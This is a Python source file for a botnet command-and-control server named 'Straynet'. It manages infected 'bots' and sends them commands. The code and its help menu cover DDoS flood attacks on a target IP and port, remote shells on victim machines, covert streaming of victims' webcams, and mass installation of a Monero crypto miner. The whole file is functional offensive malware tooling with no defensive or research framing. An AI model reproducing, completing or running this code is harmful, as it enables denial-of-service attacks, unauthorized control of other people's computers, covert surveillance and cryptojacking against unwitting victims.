import asyncio
import os
import sys
import cv2
import numpy as np
from rich.console import Console

class Client():
    def __init__(self, id:str=None, ip:str=None, writer:asyncio.StreamWriter=None, reader:asyncio.StreamReader=None):
        self.id = id
        self.ip = ip
        self.writer = writer
        self.reader = reader

HOST = "0.0.0.0"
PORT = 80

is_flooding = False
is_streaming_cam = False

clients: list[Client] = []

console = Console(highlight=False)
server:asyncio.Server = None

server_commands_task:asyncio.Task = None
shell_task:asyncio.Task = None
stream_cam_task:asyncio.Task = None

stream_cam_flag = True

prompt_prefix = "server:~$ "
shell_prompt_prefix = "> "
title = r"""
███████╗████████╗██████╗  █████╗ ██╗   ██╗███╗   ██╗███████╗████████╗
██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚██╗ ██╔╝████╗  ██║██╔════╝╚══██╔══╝
███████╗   ██║   ██████╔╝███████║ ╚████╔╝ ██╔██╗ ██║█████╗     ██║   
╚════██║   ██║   ██╔══██╗██╔══██║  ╚██╔╝  ██║╚██╗██║██╔══╝     ██║   
███████║   ██║   ██║  ██║██║  ██║   ██║   ██║ ╚████║███████╗   ██║   
╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝
                      [cyan]Created by Glob ~ v1[/cyan]     
"""

# Remove everything displayed in the terminal
def clear_screen():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

# Get the client from an ID
def get_client_from_id(input_id:int):
    try:
        for c in clients:
            if int(c.id) == int(input_id):
                return c
    except:
        console.print("[red](-)Client wasn't found[/red]")
        
# Get the arguments in a command
def get_arg(tokens:list, arg_token:str):
    return str(tokens[tokens.index(arg_token) + 1])

# Controls the async input
async def async_input(prompt):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, input, prompt)

# Start server + keep it going forever
async def start_server():
    global server
    global server_commands_task
    
    server = await asyncio.start_server(handle_client, HOST, PORT)
    main_gui()
    server_commands_task = asyncio.create_task(server_commands())
    await asyncio.create_task(server.serve_forever())

# The main part of the program, from here the user will control everything (commands, bots, etc)
def main_gui():
    clear_screen()
    console.print(f"[bright_red]{title}[/bright_red]")
    console.print(f"[bright_red]Server started on:[/bright_red] [cyan]{HOST}:{PORT}[/cyan]")
    console.print("[bright_red]- [cyan]'help'[/cyan] for help[/bright_red]\n")

# Gets called whenever a client connects
async def handle_client(reader:asyncio.StreamReader, writer:asyncio.StreamWriter):
    global shell_task
    global stream_cam_task
    
    try:
        id = len(clients) + 1
        ip = writer.get_extra_info("peername")
        client = Client(id, ip, writer, reader)
        clients.append(client)
        
        while True:
            try:
                header_data = await client.reader.readuntil(b"\n")
                header_parts = header_data.split(b":")
                header_parts = [h.strip() for h in header_parts]
                
                byte_length = int(header_parts[header_parts.index(b"byte-length") + 1])
                data = await client.reader.readexactly(byte_length)
                
                if b"stream-cam-marker" in header_parts:
                    if stream_cam_flag:
                        process_stream_cam(client, data)
                    else:
                        asyncio.create_task(reset_cam_flag())
                elif b"shell-marker" in header_parts:
                    shell_task = asyncio.create_task(process_shell(data, client))
                elif b"miner-marker":
                    console.print()
            except Exception as e:
                return
                #console.print(f"[red](-) Error: {e}[/red]")
    except (asyncio.CancelledError, ConnectionRefusedError, asyncio.exceptions.IncompleteReadError, ConnectionResetError) as e:
        console.print(f"[red](-) Connection Error: {e}[/red]")
    except Exception as e:
        console.print(f"[red](-) Error: {e}[/red]")
    finally:
        clients.remove(client)
        writer.close()

# Handles the server commands
async def server_commands():
    while True:
        command = await async_input(f"\n{prompt_prefix}")
        await parse_command(command)
        await asyncio.sleep(0.01)
        
# Parse commands to client
async def parse_command(command:str):
    global shell_task
    
    try:
        tokens = command.split()
        if not tokens:
            console.print("[red](-) No command was input[/red]")
        
        command = tokens[0]
        if command == "help":
            output_help()
        elif command == "clear":
            main_gui()
        elif command == "ls":
            await list_clients()
        elif command == "info":
            await get_info(tokens)
        elif command == "rm":
            await do_remove(tokens)
        elif command == "flood":
            await flood(tokens)
        elif command == "stop_flood":
            await stop_flood()
        elif command == "shell":
            server_commands_task.cancel()
            shell_task = asyncio.create_task(shell(tokens))
        elif command == "stream_cam":
            stream_cam(tokens)
        elif command == "miner":
            miner(tokens)
        elif command == "quit":
            sys.exit()
        else:
            console.print("[red](-) Command not found[/red]")
    except:
        pass

# Prints out a list of all connected clients
async def list_clients():
    console.print(f"[cyan]Bots: {len(clients)}")
    for c in clients:
        console.print(f"[cyan]ID: {c.id}    IP: {c.ip}[/cyan]")

# Prints info on the client, such as ip, os, etc
async def get_info(tokens:list):
    try:
        client = get_client_from_id(get_arg(tokens, "-id"))
        
        console.print(f"[cyan]Client ID: {client.id}[/cyan]")
        console.print(f"[cyan]IP: {client.ip}[/cyan]")
    except (ValueError, IndexError):
        console.print("[red](-) Formatting error: 'info -id (USER_ID)'[/red]")

# Remove the client from the server
async def do_remove(tokens:list):
    try:
        client = get_client_from_id(get_arg(tokens, "-id"))
        
        client.writer.write("delete_self".encode())
        await client.writer.drain()
        client.writer.close()
        console.print("[cyan](*) Removed user[cyan]")
    except (ValueError, IndexError):
        console.print("[red](-) Formatting error: 'rm -id (USER_ID)'[/red]")

# Start a flood attack (DDOS)
async def flood(tokens:list):
    global is_flooding
    try:
        if is_flooding:
            console.print("[cyan](*) A flooding attack is already happening, stop it with 'stop_flood'[/cyan]")
            return
        
        tokens = " ".join(tokens)
        for c in clients:
            c.writer.write(str(tokens).encode())
            await c.writer.drain()
            
        console.print("[cyan](*) Flooding attack started[/cyan]")
        is_flooding = True
    except (ValueError, IndexError):
        console.print("[red](-) Formatting Error: 'flood -ip (IP ADDRESS) -port (PORT)'[/red]")

# Stops the flood attack (DDOS)
async def stop_flood():
    global is_flooding
    try:
        if not is_flooding:
            console.print("[cyan](*) There is no flooding attack currently ongoing[/cyan]")
            return
        
        for c in clients:
            c.writer.write("stop_flood".encode())
            await c.writer.drain()
        
        console.print("[cyan](*) Flooding attack stopped[/cyan]")
        is_flooding = False
    except Exception as e:
        console.print(f"[red](-) Error: {e}[/red]")

# Run a shell
async def shell(tokens):
    global server_commands_task
    
    client = get_client_from_id(get_arg(tokens, "-id"))
    console.print(f"[cyan](*) Opened shell to client id: {client.id}\nClose with 'q'[/cyan]")
    
    command = await async_input(f"\n{shell_prompt_prefix}")
        
    if command == "q":
        server_commands_task = asyncio.create_task(server_commands())
        await server_commands_task
        return
    
    client.writer.write(f"shell {command}".encode())

# Function to process the shell response from the client
async def process_shell(response_data:bytes, client:Client):
    global server_commands_task
    
    response_data = response_data.decode().splitlines()
    response_data = "\n".join(response_data)
    console.print(f"[cyan]{response_data}[/cyan]")
    
    command = await async_input(f"\n{shell_prompt_prefix}")
        
    if command == "q":
        server_commands_task = asyncio.create_task(server_commands())
        await server_commands_task
        shell_task.cancel()
    
    client.writer.write(f"shell {command}".encode())

# Send a start stream command to the client and open a window
def stream_cam(tokens:list):
    try:
        client = get_client_from_id(get_arg(tokens, "-id"))
        
        client.writer.write("stream_cam".encode())
        cv2.namedWindow(f"Bot ID: {client.id}")
        console.print("[cyan](*) Getting bot cam...[/cyan]")
    except (ValueError, IndexError):
        console.print("[red](-) Formatting Error: 'stream_cam -id (ID)'[/red]")
    except Exception as e:
        print(e)

# Process the webcam data, and display it on the screen
def process_stream_cam(client:Client, frame_data):
    global stream_cam_flag
    
    frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
    cv2.imshow(f"Bot ID: {client.id}", frame)
    
    key = cv2.waitKey(1) & 0xFF
    
    if key == ord("q") or key == 27:
        client.writer.write("stop_stream_cam".encode())
        cv2.destroyWindow(f"Bot ID: {client.id}")
        stream_cam_flag = False

# Used to bypass error, where the function 'process_stream_cam' is called after it's been exited
async def reset_cam_flag():
    global stream_cam_flag
    await asyncio.sleep(2)
    stream_cam_flag = True
    
# Download crypto miner on the client pc
def miner(tokens:list):
    try:
        id = get_arg(tokens, "-id")
        xmr_adress = get_arg(tokens, "-xmraddr")
        
        if id == "ALL":
            for c in clients:
                c.writer.write(f"miner {xmr_adress}".encode())
                c.writer.drain()
        else:
            client = get_client_from_id(int(id))
            client.writer.write(f"miner {xmr_adress}".encode())
            client.writer.drain()
            
        console.print("[cyan](*) Setting up crypto miner[/cyan]")
    except (ValueError, IndexError):
        console.print("[red](-) Formatting Error: 'miner -id (ID/ALL) -xmraddr (XMR ADRESS)[/red]'")
    
def output_help():
    console.print("""
[bright_red]╔═════════════════════════════════════════════╗
║                [cyan]- HELP MENU -[bright_red]                ║
╚═════════════════════════════════════════════╝

This tool empowers you to manage connected bots, launch attacks, and interact with client systems remotely.
Through this interface, you have control over various commands and functionalities, enabling you to:
- Initiate, stop, and monitor attacks such as floods (DDOS) to specified targets.
- Access connected bots' information, including IDs and IP addresses.
- Establish a shell connection to a specific client system for direct interaction.
- Execute commands on clients to perform various actions, such as setting up crypto miners.
- Stream camera feed from bot systems to monitor activities.
- Control connected bots and manage their connections effectively.

╔═════════════════════════════════════════════╗
║                 [cyan]- COMMANDS -[bright_red]                ║
╚═════════════════════════════════════════════╝
[cyan]help:[bright_red] Display this help message to view available commands and their functionalities.
    [cyan]- Usage: 'help'[bright_red]

[cyan]clear:[bright_red] Clear the terminal screen for better visibility and interaction.
    [cyan]- Usage: 'clear'[bright_red]

[cyan]ls:[bright_red] List all currently connected bots, displaying their IDs and IP addresses.
    [cyan]- Usage: 'ls'[bright_red]

[cyan]info:[bright_red] - Fetch detailed information about a specific bot using its assigned ID.
    [cyan]- Usage: 'info -id (USER_ID)'[bright_red]

[cyan]rm:[bright_red] - Remove a bot from the server by specifying its unique ID.
    [cyan]- Usage: 'rm -id (USER_ID)'[bright:red]

[cyan]flood:[bright_red] - Launch a flood attack (DDOS) by targeting an IP address and port.
    [cyan]- Usage: 'flood -ip (IP_ADDRESS) -port (PORT)'[bright_red]

[cyan]stop_flood:[bright_red] - Halt an ongoing flood attack initiated on the specified target, 
    can only be ran if a flood has been started already.
    [cyan]- Usage: 'stop_flood'[bright_red]
    
[cyan]shell:[bright_red] - Open a shell to access and interact with a bot's system using its ID.
    [cyan]- Usage: 'shell -id (USER_ID)'[bright_red]

[cyan]stream_cam:[bright_red] - Stream the camera feed from a bot's system for monitoring purposes.
    [cyan]- Usage: 'stream_cam -id (USER_ID)'[bright_red]

[cyan]miner:[bright_red] - Set up a crypto miner on one or multiple bot systems for mining operations.
    [cyan]- Usage: 'miner -id (USER_ID/ALL) -xmraddr (XMR_ADDRESS)'[bright_red]

[cyan]quit:[bright_red] - Exit and close the Command and Control Server.
    [cyan]- Usage: 'quit'[bright_red]
""")
    
if __name__ == "__main__":
    try:
        asyncio.run(start_server())
    except:
        pass